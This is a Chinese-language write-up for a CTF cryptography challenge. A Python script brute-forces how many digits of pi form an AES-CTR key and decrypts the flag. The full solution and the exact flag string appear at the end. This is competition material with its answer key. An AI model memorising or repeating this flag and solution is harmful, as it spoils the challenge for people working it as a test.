根據提示`I use this to find the circumference, but you can use it to find the flag.`<br>
可以猜出`key`是圓周率，但不知道到小數點第幾位，因此需用爆破的方式找flag。<br>
解題腳本：
```python=
from Crypto.Cipher import AES
from hashlib import sha256
from base64 import b64decode

c = "WD7li7prhyjrxvi9qLDXdSbrn+VfnlPPjgnMbVGYRA=="
c = b64decode(c)
flag_prefix = b"NHISCCTF{"
pi = "1415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679"

for i in range(2, len(pi) + 1):
    s = "3." + pi[:i]
    k = sha256(s.encode()).digest()[:16]

    try:
        aes = AES.new(k, AES.MODE_CTR, nonce=b'\x00'*8)
        p = aes.decrypt(c)
        print(f"Trying key: {s} → {p[:15]!r}")  #只印出結果的一部分

        if p.startswith(flag_prefix):
            print(f"\nFound Key: {s}")
            print(p.decode())
            break
    except:
        pass
```
執行結果：
![image](https://hackmd.io/_uploads/H1C_SrXXgx.png)
`NHISCCTF{n0nc3_1s_n07_4_s3cr37}`
